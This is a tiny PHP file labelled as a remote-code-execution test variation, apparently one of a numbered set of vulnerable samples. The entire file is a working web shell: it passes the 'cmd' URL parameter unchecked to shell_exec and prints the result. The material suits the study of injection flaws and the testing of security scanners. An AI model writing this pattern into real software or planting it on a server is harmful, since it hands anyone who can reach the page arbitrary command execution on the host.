<?php
// RCE test variation #63
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>